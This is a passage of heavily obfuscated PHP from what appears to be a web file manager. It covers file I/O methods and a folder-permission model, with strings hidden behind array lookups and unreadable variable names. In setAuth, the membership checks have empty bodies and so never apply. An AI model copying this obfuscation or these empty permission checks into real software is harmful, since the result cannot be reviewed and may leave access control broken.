!0 : !1; } public function isFile($Ö­ôşç) { $æµÃ½„¸ =& $_SERVER[Õò”†—·]; $Ÿ÷øéü = $this->infoSimple($Ö­ôşç); return $Ÿ÷øéü && $Ÿ÷øéü[$æµÃ½„¸[469]] == $æµÃ½„¸[229] ? !0 : !1; } public function isFolder($Á°Ã¾¬‘) { $©œ˜¾ŞÅ =& $_SERVER[Õò”†—·]; $—Æë¨®¡ = $this->infoSimple($Á°Ã¾¬‘); return $—Æë¨®¡ && $—Æë¨®¡[$©œ˜¾ŞÅ[469]] == $©œ˜¾ŞÅ[101] ? !0 : !1; } public function listPath($éÊ´²ş, $ÌÚ†¥şØ = false) { $Ùúš´¥ö =& $_SERVER[Õò”†—·]; if ($éÊ´²ş == $Ùúš´¥ö[22]) { return !1; } $Û„†‹» = array($Ùúš´¥ö[461] => $éÊ´²ş); if ($ÌÚ†¥şØ) { return $this->model->listSource($Û„†‹», -1); } return $this->model->listSource($Û„†‹»); } public function has($Ù³üÔƒ×, $ïæ‘İ¢ = false, $šêœå¡– = null) { $ä¬ Ë¯‘ =& $_SERVER[Õò”†—·]; $­“«¥ü¹ = $this->infoWithChildren($Ù³üÔƒ×); if ($ïæ‘İ¢) { return array($ä¬ Ë¯‘[241] => $­“«¥ü¹[$ä¬ Ë¯‘[241]], $ä¬ Ë¯‘[240] => $­“«¥ü¹[$ä¬ Ë¯‘[240]]); } return $šêœå¡– ? $­“«¥ü¹[$ä¬ Ë¯‘[241]] : $­“«¥ü¹[$ä¬ Ë¯‘[240]]; } public function listAll($©í¦çŸ‹) { $³æşıÕÎ = IO::info($this->pathParse[$_SERVER[Õò”†—·][97]]); if (!$³æşıÕÎ) { return array(); } return $this->model->listAll($©í¦çŸ‹); } public function getContent($æ¸Úş¦«) { return $this->model->getContent($æ¸Úş¦«); } public function setContent($Šà“¡‚È, $ĞƒÜÛ¼ = '') { return $this->model->setContent($Šà“¡‚È, $ĞƒÜÛ¼); } public function fileSubstr($´ğšƒ°”, $êñçïõ, $ÁüĞğû) { return $this->model->fileSubstr($´ğšƒ°”, $êñçïõ, $ÁüĞğû); } public function download($Öéª¿ì, $¬éã¨Ù× = '') { $É¥ïèˆø = get_path_father($¬éã¨Ù×); $ÒÏ«­Š© = get_path_this($¬éã¨Ù×); $¾³ßù¨ = $this->model->fileInfoGet($Öéª¿ì); $Û¿å½ñ = IO::copy($¾³ßù¨[$_SERVER[Õò”†—·][97]], $É¥ïèˆø, !1, $ÒÏ«­Š©); return $Û¿å½ñ; } public function setModifyTime($ÎÇÜı…÷, $ã©˜íÏğ = '') { $ˆ«ÆËâÚ =& $_SERVER[Õò”†—·]; if (!$ÎÇÜı…÷) { return; } $this->model->where(array($ˆ«ÆËâÚ[475] => $ÎÇÜı…÷))->save(array($ˆ«ÆËâÚ[98] => $ã©˜íÏğ)); } public function upload($Üš¶ëÏ, $«¥êãÁ, $É¢Ø¦ëù = false, $µõ–ØĞ = REPEAT_REPLACE) { $ÂĞò·â© =& $_SERVER[Õò”†—·]; $Àš›Îâ = $this->parse($Üš¶ëÏ); $¸Ô°„Ã” = $this->model->addFile($Àš›Îâ[$ÂĞò·â©[459]], $«¥êãÁ, $Àš›Îâ[$ÂĞò·â©[97]], $É¢Ø¦ëù, $µõ–ØĞ); return $this->getPathOuter($¸Ô°„Ã”); } public function uploadFileByID($¤«ƒä–, $óº¾Ÿ¸, $û«¹«ÀÖ) { $é³âƒ =& $_SERVER[Õò”†—·]; $êÓ¦¯ŠŸ = $this->parse($¤«ƒä–); $à÷’Ô÷ë = $this->model->addFileByFileID($êÓ¦¯ŠŸ[$é³âƒ[459]], $óº¾Ÿ¸, $êÓ¦¯ŠŸ[$é³âƒ[97]], $û«¹«ÀÖ); return $this->getPathOuter($à÷’Ô÷ë); } public function addFileByRemote($Æ©çˆŞ, $€ÎÛ¬ûæ, $®§ş‘ Ç = array(), $Îñ¨Š“è = '', $µòØ”›Ã) { $Èõ½ı·º =& $_SERVER[Õò”†—·]; $ÑáÀœ¹ = $this->parse($Æ©çˆŞ); $Îñ¨Š“è = empty($Îñ¨Š“è) ? $ÑáÀœ¹[$Èõ½ı·º[97]] : $Îñ¨Š“è; $Ñ¤ìÇ¹ = $this->model->addFileByRemote($ÑáÀœ¹[$Èõ½ı·º[459]], $€ÎÛ¬ûæ, $Îñ¨Š“è, $®§ş‘ Ç, $µòØ”›Ã); return $this->getPathOuter($Ñ¤ìÇ¹); } public function uploadLink($¼ìœÉèå, $ÌíŸà¶º = 0) { $á–Š¢ø =& $_SERVER[Õò”†—·]; $üœĞæÇî = $this->parse($¼ìœÉèå); $ìÜİ˜Ã¼ = _get($GLOBALS[$á–Š¢ø[17]], $á–Š¢ø[1390]); $‹²Üáö = _get($GLOBALS[$á–Š¢ø[17]], $á–Š¢ø[1391]); $¼ìœÉèå = Model($á–Š¢ø[658])->createFileName($üœĞæÇî[$á–Š¢ø[97]], $ìÜİ˜Ã¼, $‹²Üáö); return IO::uploadLink($¼ìœÉèå, $ÌíŸà¶º); } public function fileNameAuto($›´œÖŒë, $’©à¬õ¯, $´ó†®¸ = REPEAT_REPLACE, $¬‹åûæÎ = false) { return $this->model->fileNameAuto($›´œÖŒë, $’©à¬õ¯, $´ó†®¸, $¬‹åûæÎ); } public function fileNameExist($ë†˜Ì, $¥°ö®´£) { return $this->model->fileNameExist($ë†˜Ì, $¥°ö®´£); } protected function _fileOut($ÍÉççä¾, $Şú Í“ = false, $é‘Ú = false, $ù¬áÃÏ± = '', $¹¤¤ç¹ƒ = false) { $åå°·ÊÛ =& $_SERVER[Õò”†—·]; $ÅìÒ„ƒğ = $this->model->sourceInfo($ÍÉççä¾); if ($ÅìÒ„ƒğ[$åå°·ÊÛ[469]] == $åå°·ÊÛ[101]) { header($åå°·ÊÛ[1392]); die; } $ÓøÑ¤Ç = $this->model->fileInfoGet($ÍÉççä¾); $ù¬áÃÏ± = $ÓøÑ¤Ç[$åå°·ÊÛ[531]] ? $ÓøÑ¤Ç[$åå°·ÊÛ[531]] : $ù¬áÃÏ±; $ô‡õ«Œş = is_array($GLOBALS[$åå°·ÊÛ[182]]) ? $GLOBALS[$åå°·ÊÛ[182]][$åå°·ÊÛ[42]] : $ÅìÒ„ƒğ[$åå°·ÊÛ[42]]; if ($¹¤¤ç¹ƒ) { return IO::fileOutServer($ÓøÑ¤Ç[$åå°·ÊÛ[97]], $Şú Í“, $ô‡õ«Œş, $ù¬áÃÏ±); } IO::fileOut($ÓøÑ¤Ç[$åå°·ÊÛ[97]], $Şú Í“, $ô‡õ«Œş, $ù¬áÃÏ±); } public function fileOut($×Ø¢©šø, $äøœÂûê = false, $ï‹İÕ÷Â = false, $Øå°üî = '') { $this->_fileOut($×Ø¢©šø, $äøœÂûê, $ï‹İÕ÷Â, $Øå°üî); } public function fileOutServer($ÁàáõŞŸ, $ËÚÇÎ€ß = false, $Ë¯‡‘£… = false, $¶ëú¤Ö = '') { $this->_fileOut($ÁàáõŞŸ, $ËÚÇÎ€ß, $Ë¯‡‘£…, $¶ëú¤Ö, !0); } protected function _fileOutImage($åûÚ€ó, $öÔãÎ¢ = 250) { $«ºè«ë =& $_SERVER[Õò”†—·]; $Şµñ‹ßú = $this->model->pathInfo($åûÚ€ó); if ($Şµñ‹ßú[$«ºè«ë[469]] == $«ºè«ë[101]) { show_json($«ºè«ë[1393] . $åûÚ€ó, !1); } $„úÚƒø£ = $this->model->fileInfoGet($åûÚ€ó); $Şµñ‹ßú[$«ºè«ë[183]] = $„úÚƒø£[$«ºè«ë[97]]; $GLOBALS[$«ºè«ë[182]] = $Şµñ‹ßú; IO::fileOutImage($„úÚƒø£[$«ºè«ë[97]], $öÔãÎ¢); } public function fileOutImage($°´ÀªëÉ, $ÕşÁ‡š” = 250) { $this->_fileOutImage($°´ÀªëÉ, $ÕşÁ‡š”); } public function fileOutImageServer($¸ «¦¶İ, $àù£¢¡Ğ = 250) { $this->_fileOutImage($¸ «¦¶İ, $àù£¢¡Ğ); } public function link($è—£Èïê, $¼‰¦œ¡ó = '') { $¨ˆªÀ‘Ó = $this->model->fileInfoGet($è—£Èïê); return IO::link($¨ˆªÀ‘Ó[$_SERVER[Õò”†—·][97]], $¼‰¦œ¡ó); } protected function parse($”‰®šÒ´) { $õöš† =& $_SERVER[Õò”†—·]; if (strstr($”‰®šÒ´, $õöš†[18]) === !1) { return array($õöš†[477] => intval($”‰®šÒ´), $õöš†[97] => $õöš†[22], $õöš†[1389] => array()); } $Œµò ¢Ø = explode($õöš†[18], trim($”‰®šÒ´, $õöš†[18])); if (count($Œµò ¢Ø) < 2) { show_tips(clear_html($”‰®šÒ´) . $õöš†[1394]); } return array($õöš†[477] => intval($Œµò ¢Ø[0]), $õöš†[97] => $Œµò ¢Ø[1], $õöš†[1389] => array_slice($Œµò ¢Ø, 1)); } } goto DÜ©Ä¼¤; AèğÌšîóã: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\x63\x65\137\x61\165\164\x68"; public function getAuth($¡åÚêå) { $Î¿‡Ù”Ú =& $_SERVER[Õò”†—·]; $Éœëèğ = $this->sourceAuthSelect($¡åÚêå); $Ù­õ¶şª = array(); $Ù£·Ä¸½ = array(); $ëª˜Á×É = 2 << 25; foreach ($Éœëèğ as $Á˜Ã‰Š) { $çÙæ±™ = Model($Î¿‡Ù”Ú[556])->listData($Á˜Ã‰Š[$Î¿‡Ù”Ú[2062]]); if (!$çÙæ±™) { continue; } $Ù­õ¶şª[] = $Á˜Ã‰Š; $¯³›Õ÷ô = 0; if ($Á˜Ã‰Š[$Î¿‡Ù”Ú[191]] == SourceModel::TYPE_GROUP) { $¯³›Õ÷ô = $ëª˜Á×É * 2; } if ($Á˜Ã‰Š[$Î¿‡Ù”Ú[191]] == SourceModel::TYPE_USER) { $¯³›Õ÷ô = $ëª˜Á×É; } if ($Á˜Ã‰Š[$Î¿‡Ù”Ú[191]] == SourceModel::TYPE_USER && $Á˜Ã‰Š[$Î¿‡Ù”Ú[554]] == $Î¿‡Ù”Ú[229]) { $¯³›Õ÷ô = 0; } $Ù£·Ä¸½[] = $çÙæ±™[$Î¿‡Ù”Ú[471]] + $¯³›Õ÷ô; } array_multisort($Ù£·Ä¸½, SORT_DESC, $Ù­õ¶şª); return $Ù­õ¶şª; } public function sourceAuthSelect($®šæùéì) { $¸ÛË›¯¤ =& $_SERVER[Õò”†—·]; static $­˜«ÍÍ½ = array(); $Æˆ¾È¾× = is_array($®šæùéì) ? !1 : !0; if ($Æˆ¾È¾×) { $®šæùéì = array($®šæùéì); } $îÖŠÏÌŞ = array(); foreach ($®šæùéì as $§ş”ûÉé) { if (isset($­˜«ÍÍ½[$§ş”ûÉé])) { $îÖŠÏÌŞ[$§ş”ûÉé] = $­˜«ÍÍ½[$§ş”ûÉé]; } } if (count($îÖŠÏÌŞ) == count($®šæùéì)) { return $Æˆ¾È¾× ? $îÖŠÏÌŞ[$®šæùéì[0]] : $îÖŠÏÌŞ; } $ºËš—Ü… = $¸ÛË›¯¤[2139]; $•´¸ÈÄ¹ = array($¸ÛË›¯¤[194] => array($¸ÛË›¯¤[17], $®šæùéì)); $É’Ù‹’‹ = $this->field($ºËš—Ü…)->order($¸ÛË›¯¤[459])->where($•´¸ÈÄ¹)->select(); $ŸßÃŠû = array_to_keyvalue_group($É’Ù‹’‹, $¸ÛË›¯¤[194]); foreach ($®šæùéì as $§ş”ûÉé) { $­˜«ÍÍ½[$§ş”ûÉé] = $ŸßÃŠû[$§ş”ûÉé] ? $ŸßÃŠû[$§ş”ûÉé] : array(); } if ($Æˆ¾È¾×) { return $É’Ù‹’‹; } return $ŸßÃŠû; } public function setAuth($œ˜Ü¸İÕ, $èÆÀÇª²) { $Û³—óÄë =& $_SERVER[Õò”†—·]; $¡±°³ğ = Model($Û³—óÄë[1388])->sourceInfo($œ˜Ü¸İÕ); if (!$¡±°³ğ) { return !1; } if ($¡±°³ğ[$Û³—óÄë[191]] != SourceModel::TYPE_GROUP) { return !1; } $èÈÀĞÉâ = 1; $­§äüë§ = $¡±°³ğ[$Û³—óÄë[554]]; if ($­§äüë§ != $èÈÀĞÉâ) { $×ğç«µ– = array($Û³—óÄë[1953] => $­§äüë§); $òö¼™¤Ì = Model($Û³—óÄë[2048])->field($Û³—óÄë[1755])->where($×ğç«µ–)->select(); $òö¼™¤Ì = array_to_keyvalue($òö¼™¤Ì, $Û³—óÄë[22], $Û³—óÄë[1755]); } $ë­Ÿˆ®‚ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $»¾Îò¨€ = array(); foreach ($èÆÀÇª² as $ª“Ìœ°æ) { if (!in_array($ª“Ìœ°æ[$Û³—óÄë[191]], $ë­Ÿˆ®‚)) { show_json(LNG($Û³—óÄë[2140]), !1); } if ($­§äüë§ != $èÈÀĞÉâ) { if ($ª“Ìœ°æ[$Û³—óÄë[191]] == SourceModel::TYPE_GROUP) { } if ($ª“Ìœ°æ[$Û³—óÄë[554]] != 0 && !in_array($ª“Ìœ°æ[$Û³—óÄë[554]], $òö¼™¤Ì)) { } } if ($ª“Ìœ°æ[$Û³—óÄë[554]] == 0) { $ª“Ìœ°æ[$Û³—óÄë[191]] = SourceModel::TYPE_USER; } $»¾Îò¨€[] = array($Û³—óÄë[194] => $œ˜Ü¸İÕ, $Û³—óÄë[191] => intval($ª“Ìœ°æ[$Û³—óÄë[191]]), $Û³—óÄë[554] => intval($ª“Ìœ°æ[$Û³—óÄë[554]]), $Û³—óÄë[2062] => intval($ª“Ìœ°æ[$Û³—óÄë[2062]]) ? intval($ª“Ìœ°æ[$Û³—óÄë[2062]]) : 0, $Û³—óÄë[2122] => intval($ª“Ìœ°æ[$Û³—óÄë[2122]]) ? intval($ª“Ìœ°æ[$Û³—óÄë[2122]]) : -1); } $this->where(array($Û³—óÄë[475] => $œ˜Ü¸İÕ))->delete(); $this->addAll($»¾Îò¨€); return !0; } public function authClear($¼çû½§¯) { $æÁş¦ˆ” =& $_SERVER[Õò”†—·]; $®ÙÌ‘Ä = Model($æÁş¦ˆ”[1388])->sourceInfo($¼çû½§¯); $ëã¢ö± = array($¼çû½§¯); if ($®ÙÌ‘Ä[$æÁş¦ˆ”[469]] == $æÁş¦ˆ”[101]) { $ûù•å±Â = array($æÁş¦ˆ”[636] => array($æÁş¦ˆ”[596], $®ÙÌ‘Ä[$æÁş¦ˆ”[569]] . $¼çû½§¯ . $æÁş¦ˆ”[597])); $ëã¢ö± = Model($æÁş¦ˆ”[1388])->field($æÁş¦ˆ”[475])->where($ûù•å±Â)->getField($æÁş¦ˆ”[194], !0); $ëã¢ö±[] = $¼çû½§¯; } $this->where(array($æÁş¦ˆ”[475] => array($æÁş¦ˆ”[476], $ëã¢ö±)))->delete(); return !0; } public function getAllChildren($ğÄıÚ›è) { $¸ÁÙ¾· =& $_SERVER[Õò”†—·]; $‘¬Òò¼ = Model($¸ÁÙ¾·[1388])->sourceInfo($ğÄıÚ›è); if ($‘¬Òò¼[$¸ÁÙ¾·[469]] != $¸ÁÙ¾·[101]) { return $this->sourceListAuth(array($ğÄıÚ›è)); } if ($‘¬Òò¼[$¸ÁÙ¾·[191]] != SourceModel::TYPE_GROUP) { return array(); } $€íÅäé² = 1; $ğûü«šÊ = array($ğÄıÚ›è); if ($‘¬Òò¼[$¸ÁÙ¾·[193]] == $¸ÁÙ¾·[229] && $‘¬Òò¼[$¸ÁÙ¾·[554]] != $€íÅäé²) { $ğûü«šÊ = $this->groupChidldAllRootSource($‘¬Òò¼[$¸ÁÙ¾·[554]]); } $Æ‚å²Œ = $this->field($¸ÁÙ¾·[194])->group($¸ÁÙ¾·[194])->select(); $Æ‚å²Œ = array_to_keyvalue($Æ‚å²Œ, $¸ÁÙ¾·[22], $¸ÁÙ¾·[194]); if (!$Æ‚å²Œ) { return array(); } $…íóèƒÓ = $¸ÁÙ¾·[2141]; $ãóªÌşÖ = array($¸ÁÙ¾·[194] => array($¸ÁÙ¾·[17], $Æ‚å²Œ), $¸ÁÙ¾·[489] => $¸ÁÙ¾·[229]); $İ„Ã‰– = Model($¸ÁÙ¾·[875])->field($…íóèƒÓ)->where($ãóªÌşÖ)->select(); $Œ¿¢¿‰¤ = array($ğÄıÚ›è); foreach ($İ„Ã‰– as $¶Çî¡æ´) { foreach ($ğûü«šÊ as $ûÖÒ‹Î”) { $¯¥”“Â = $¸ÁÙ¾·[60] . $ûÖÒ‹Î” . $¸ÁÙ¾·[60]; $à‘¡»õŒ = $¶Çî¡æ´[$¸ÁÙ¾·[569]] . $¶Çî¡æ´[$¸ÁÙ¾·[194]] . $¸ÁÙ¾·[60]; if (strstr($à‘¡»õŒ, $¯¥”“Â)) { $Œ¿¢¿‰¤[] = $¶Çî¡æ´[$¸ÁÙ¾·[194]]; break; } } } return $this->sourceListAuth($Œ¿¢¿‰¤); } private function sourceListAuth($‘¹î–ŒÓ) { $ Ù¹£°ˆ =& $_SERVER[Õò”†—·]; $¶–šªª = Model($ Ù¹£°ˆ[1388])->sourceListInfo($‘¹î–ŒÓ, !0); $•ùÏò“ = $this->sourceAuthSelect($‘¹î–ŒÓ); $ûúé–… = array(); $µ²¶³• = array(); foreach ($¶–šªª as $¨ïâˆ³œ) { unset($¨ïâˆ³œ[$ Ù¹£°ˆ[513]]); unset($¨ïâˆ³œ[$ Ù¹£°ˆ[511]]); unset($¨ïâˆ³œ[$ Ù¹£°ˆ[471]]); unset($¨ïâˆ³œ[$ Ù¹£°ˆ[100]]); $ÉÕåû¡ë = $•ùÏò“[$¨ïâˆ³œ[$ Ù¹£°ˆ[194]]]; if (!$ÉÕåû¡ë) { continue; } $¨ïâˆ³œ[$ Ù¹£°ˆ[2142]] = $this->authTargetInfo($ÉÕåû¡ë); $¨ïâˆ³œ[$ Ù¹£°ˆ[567]] = rtrim($¨ïâˆ³œ[$ Ù¹£°ˆ[573]], $ Ù¹£°ˆ[18]) . $ Ù¹£°ˆ[18] . ltrim($¨ïâˆ³œ[$ Ù¹£°ˆ[567]], $ Ù¹£°ˆ[18]); $ûúé–…[] = $¨ïâˆ³œ; $¿ËÈ¹…¡ = count(explode($ Ù¹£°ˆ[18], trim($¨ïâˆ³œ[$ Ù¹£°ˆ[567]], $ Ù¹£°ˆ[18]))); $µ²¶³•[] = $¿ËÈ¹…¡ + ($¨ïâˆ³œ[$ Ù¹£°ˆ[43]] == $ Ù¹£°ˆ[88] ? 0 : 1000); } array_multisort($µ²¶³•, SORT_ASC, $ûúé–…); return $ûúé–…; } private function groupChidldAllRootSource($Á˜£Üİ») { $‚“ÎŠ›ı =& $_SERVER[Õò”†—·]; $àòÜÒÅ = Model($‚“ÎŠ›ı[2143])->groupChildrenAll($Á˜£Üİ»); $Ø˜çï³Ë = array($‚“ÎŠ›ı[193] => 0, $‚“ÎŠ›ı[554] => array($‚“ÎŠ›ı[17], $àòÜÒÅ), $‚“ÎŠ›ı[191] => SourceModel::TYPE_GROUP); $˜˜Ö’Áè = Model($‚“ÎŠ›ı[875])->field($‚“ÎŠ›ı[194])->where($Ø˜çï³Ë)->select(); $˜˜Ö’Áè = array_to_keyvalue($˜˜Ö’Áè, $‚“ÎŠ›ı[22], $‚“ÎŠ›ı[194]); return $˜˜Ö’Áè; } private function authTargetInfo($ªå‹Ôå) { $¥ÀáÖæÒ =& $_SERVER[Õò”†—·]; $¸£……£ = array(); $³‘‚İ¤é = array(); $²ÃÖÊñ = 2 << 25; foreach ($ªå‹Ôå as $Òñç‹¶) { $é¶Ÿáã³ = Model($¥ÀáÖæÒ[556])->listData($Òñç‹¶[$¥ÀáÖæÒ[2062]]); if (!$é¶Ÿáã³) { continue; } if ($Òñç‹¶[$¥ÀáÖæÒ[191]] == SourceModel::TYPE_USER) { $ï­§“šÖ = Model($¥ÀáÖæÒ[562])->getInfoSimpleOuter($Òñç‹¶[$¥ÀáÖæÒ[554]]); if ($ï­§“šÖ[$¥ÀáÖæÒ[1755]] == $¥ÀáÖæÒ[1242]) { continue; } if ($ï­§“šÖ[$¥ÀáÖæÒ[1755]] == $¥ÀáÖæÒ[229]) { $ï­§“šÖ[$¥ÀáÖæÒ[42]] = LNG($¥ÀáÖæÒ[2144]); } } else { $ï­§“šÖ = Model($¥ÀáÖæÒ[570])->getInfoSimple($Òñç‹¶[$¥ÀáÖæÒ[554]]); } if (!$ï­§“šÖ) { continue; } $ï­§“šÖ[$¥ÀáÖæÒ[524]] = $é¶Ÿáã³; $¸£……£[] = $ï­§“šÖ; $ıëÏ»Ï„ = 0; if ($Òñç‹¶[$¥ÀáÖæÒ[191]] == SourceModel::TYPE_GROUP) { $ıëÏ»Ï„ = $²ÃÖÊñ * 2; } if ($Òñç‹¶[$¥ÀáÖæÒ[191]] == SourceModel::TYPE_USER) { $ıëÏ»Ï„ = $²ÃÖÊñ; } if ($Òñç‹¶[$¥ÀáÖæÒ[191]] == SourceModel::TYPE_USER && $Òñç‹¶[$¥ÀáÖæÒ[554]] == $¥ÀáÖæÒ[229]) { $ıëÏ»Ï„ = 0; } $³‘‚İ¤é[] = $é¶Ÿáã³[$¥ÀáÖæÒ[471]] + $ıëÏ»Ï„; } array_multisort($³‘‚İ¤é, SORT_DESC, $¸£……£); return $¸£……£; } public function getAllChildrenByUser($Ÿã·š, $õ½˜¤ù˜) { $Ï€Ì›¼Ø =& $_SERVER[Õò”†—·]; $—„ä´Öó = Model($Ï€Ì›¼Ø[583])->getInfo($õ½˜¤ù˜); if (!$õ½˜¤ù˜ || !$Ÿã·š || !$—„ä´Öó) { return array(); } $…ÍòÜ­ñ = Model($Ï€Ì›¼Ø[1388])->sourceInfo($Ÿã·š); $¨­»ä×Ï = array(); $ñ¾Ü”¯ì = 1; if ($…ÍòÜ­ñ[$Ï€Ì›¼Ø[193]] == $Ï€Ì›¼Ø[229] && $…ÍòÜ­ñ[$Ï€Ì›¼Ø[554]] != $ñ¾Ü”¯ì && $this->groupContainUser($…ÍòÜ­ñ[$Ï€Ì›¼Ø[554]], $õ½˜¤ù˜)) { foreach ($—„ä´Öó[$Ï€Ì›¼Ø[2145]] as $Ä²Æ©£) { $Òïâ¹ö = Model($Ï€Ì›¼Ø[570])->getInfo($Ä²Æ©£[$Ï€Ì›¼Ø[1953]]); $ÊºÀ¯©‹ = Model($Ï€Ì›¼Ø[583])->getInfoSimpleOuter($õ½˜¤ù˜); $ÊºÀ¯©‹[$Ï€Ì›¼Ø[524]] = $Ä²Æ©£[$Ï€Ì›¼Ø[471]]; if (Model($Ï€Ì›¼Ø[556])->authCheckAction($Ä²Æ©£[$Ï€Ì›¼Ø[471]][$Ï€Ì›¼Ø[471]], $Ï€Ì›¼Ø[1974])) { continue; } $Â÷úòà = array($Ï€Ì›¼Ø[42] => $Ï€Ì›¼Ø[1262] . $Òïâ¹ö[$Ï€Ì›¼Ø[42]], $Ï€Ì›¼Ø[194] => $Òïâ¹ö[$Ï€Ì›¼Ø[100]][$Ï€Ì›¼Ø[194]], $Ï€Ì›¼Ø[97] => KodIO::make($Òïâ¹ö[$Ï€Ì›¼Ø[100]][$Ï€Ì›¼Ø[194]]), $Ï€Ì›¼Ø[193] => $Ï€Ì›¼Ø[229], $Ï€Ì›¼Ø[191] => $Ï€Ì›¼Ø[563], $Ï€Ì›¼Ø[43] => $Ï€Ì›¼Ø[600], $Ï€Ì›¼Ø[567] => $Òïâ¹ö[$Ï€Ì›¼Ø[574]], $Ï€Ì›¼Ø[1953] => $Òïâ¹ö[$Ï€Ì›¼Ø[1953]], $Ï€Ì›¼Ø[571] => $Òïâ¹ö[$Ï€Ì›¼Ø[193]], $Ï€Ì›¼Ø[2142] => array($ÊºÀ¯©‹)); $¨­»ä×Ï[$Â÷úòà[$Ï€Ì›¼Ø[194]]] = $Â÷úòà; } } $Û¼”Ä“Õ = array(); $°Ş€È­ = $this->getAllChildren($Ÿã·š); foreach ($°Ş€È­ as $„Û³ƒÙµ) { $‡”¤—”Å = !1; foreach ($„Û³ƒÙµ[$Ï€Ì›¼Ø[2142]] as $ø€Çë°±) { if ($ø€Çë°±[$Ï€Ì›¼Ø[1755]]) { if ($ø€Çë°±[$Ï€Ì›¼Ø[1755]] == $õ½˜¤ù˜) { $‡”¤—”Å = !0; break; } } if ($ø€Çë°±[$Ï€Ì›¼Ø[1953]]) { if ($this->groupContainUser($ø€Çë°±[$Ï€Ì›¼Ø[1953]], $õ½˜¤ù˜)) { $‡”¤—”Å = !0; break; } } } if ($‡”¤—”Å) { $Û¼”Ä“Õ[] = $„Û³ƒÙµ; } $’ŞîØÄò = $„Û³ƒÙµ[$Ï€Ì›¼Ø[194]]; if (isset($¨­»ä×Ï[$’ŞîØÄò])) { $„Û³ƒÙµ[$Ï€Ì›¼Ø[2142]][] = $¨­»ä×Ï[$’ŞîØÄò][0]; $¨­»ä×Ï[$’ŞîØÄò] = !1; } } $¨­»ä×Ï = array_filter(array_values($¨­»ä×Ï)); $Û¼”Ä“Õ = array_merge($¨­»ä×Ï, $Û¼”Ä“Õ); return $Û¼”Ä“Õ; } public function setAllChildrenByUser($àÆáÜ¢Û, $õ»¾îÙï, $²¤ëÖ˜Ó) { $Œ°ÉªÅ =& $_SERVER[Õò”†—·]; $“ËØº˜… = $this->getAllChildrenByUser($àÆáÜ¢Û, $õ»¾îÙï); if (!$²¤ëÖ˜Ó || !$“ËØº˜…) { return !1; } foreach ($“ËØº˜… as $Â‰Å½‰¨) { $–ä¸´™ = array(); foreach ($Â‰Å½‰¨[$Œ°ÉªÅ[2142]] as $Úôò«®) { $…£¹ìõÄ = $Úôò«®[$Œ°ÉªÅ[524]]; $èäŸöíì = $Úôò«®[$Œ°ÉªÅ[1755]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $™øóØšÙ = $Úôò«®[$Œ°ÉªÅ[1755]] ? $Úôò«®[$Œ°ÉªÅ[1755]] : $Úôò«®[$Œ°ÉªÅ[1953]]; if ($Úôò«®[$Œ°ÉªÅ[1755]] && $Úôò«®[$Œ°ÉªÅ[1755]] == $õ»¾îÙï) { continue; } $–ä¸´™[] = array($Œ°ÉªÅ[194] => $Â‰Å½‰¨[$Œ°ÉªÅ[194]], $Œ°ÉªÅ[191] => $èäŸöíì, $Œ°ÉªÅ[554] => intval($™øóØšÙ), $Œ°ÉªÅ[2062] => isset($…£¹ìõÄ[$Œ°ÉªÅ[459]]) ? intval($…£¹ìõÄ[$Œ°ÉªÅ[459]]) : 0, $Œ°ÉªÅ[2122] => isset($…£¹ìõÄ[$Œ°ÉªÅ[2122]]) ? intval($…£¹ìõÄ[$Œ°ÉªÅ[2122]]) : -1); } $–ä¸´™[] = array($Œ°ÉªÅ[194] => $Â‰Å½‰¨[$Œ°ÉªÅ[194]], $Œ°ÉªÅ[191] => SourceModel::TYPE_USER, $Œ°ÉªÅ[554] => intval($õ»¾îÙï), $Œ°ÉªÅ[2062] => intval($²¤ëÖ˜Ó), $Œ°ÉªÅ[2122] => -1); $this->where(array($Œ°ÉªÅ[475] => $Â‰Å½‰¨[$Œ°ÉªÅ[194]]))->delete(); $this->addAll($–ä¸´™); } return !0; } public function get($ôö¤Š®Ø) { $Î¶÷Ä = $this->getSourceList(array($ôö¤Š®Ø), !0); return $Î¶÷Ä[0]; } public function getSourceList($Í˜Ñ“¶, $ôÕš· = false, $¦‘–çîœ = false) { $ø÷‡ëâÆ =& $_SERVER[Õò”†—·]; if (!$Í˜Ñ“¶) { return array(); } $´ÏÆ¢¾Ö = Model($ø÷‡ëâÆ[1388]); if (!$ôÕš· && count($Í˜Ñ“¶) == 1) { $ôÕš· = array(); $ôÕš·[$Í˜Ñ“¶[0]] = $´ÏÆ¢¾Ö->sourceInfo($Í˜Ñ“¶[0]); } if (!$ôÕš·) { $±Àø¤•¦ = array($ø÷‡ëâÆ[475] => array($ø÷‡ëâÆ[476], $Í˜Ñ“¶)); $ôÕš· = $´ÏÆ¢¾Ö->field($ø÷‡ëâÆ[2146])->where($±Àø¤•¦)->select(); $ôÕš· = array_to_keyvalue($ôÕš·, $ø÷‡ëâÆ[194]); } $çõÕ¢âœ = $Í˜Ñ“¶; foreach ($ôÕš· as $§¡Õ÷Ë˜ => $€çÁ˜£Ø) { $Šöˆƒô™ = $´ÏÆ¢¾Ö->parentLevelArray($€çÁ˜£Ø[$ø÷‡ëâÆ[569]]); $çõÕ¢âœ = array_merge($çõÕ¢âœ, array($§¡Õ÷Ë˜), array_reverse($Šöˆƒô™)); } $çõÕ¢âœ = array_values(array_unique($çõÕ¢âœ)); if (!$çõÕ¢âœ) { return array(); } $ñ¡³ÇÏø = $this->sourceAuthSelect($çõÕ¢âœ); $çË»ÔÆÜ = array(); foreach ($çõÕ¢âœ as $àéšÆ† ) { if (isset($ñ¡³ÇÏø[$àéšÆ† ])) { $çË»ÔÆÜ[$àéšÆ† ] = $ñ¡³ÇÏø[$àéšÆ† ]; } } $”­‡ƒÙê = $this->userIsRoot($¦‘–çîœ); $¿òäŸ÷Ù = AuthModel::authAll(); $å¼ôì“ = array($ø÷‡ëâÆ[472] => $¿òäŸ÷Ù, $ø÷‡ëâÆ[2147] => array($ø÷‡ëâÆ[477] => 0, $ø÷‡ëâÆ[1959] => $¿òäŸ÷Ù, $ø÷‡ëâÆ[478] => LNG($ø÷‡ëâÆ[2148]), $ø÷‡ëâÆ[1976] => $ø÷‡ëâÆ[2149])); $£¤Õ‡·è = array(); foreach ($ôÕš· as $àéšÆ†  => $³˜¼„Ü) { if ($”­‡ƒÙê && $GLOBALS[$ø÷‡ëâÆ[16]][$ø÷‡ëâÆ[1972]]) { $£¤Õ‡·è[$àéšÆ† ] = $å¼ôì“; continue; } $£¤Õ‡·è[$àéšÆ† ] = 